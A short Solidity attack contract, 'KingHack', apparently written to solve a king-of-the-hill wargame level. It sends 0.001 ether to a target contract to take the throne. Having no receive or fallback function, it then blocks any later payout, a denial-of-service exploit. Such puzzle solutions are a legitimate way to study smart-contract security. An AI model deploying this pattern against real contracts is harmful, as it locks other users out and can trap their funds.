// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHack {

    address king;

    constructor(address _king) payable {
        king = _king;
    }

    function HackKingContract() public {
        address(king).call{value: 0.001 ether}("");
    }

}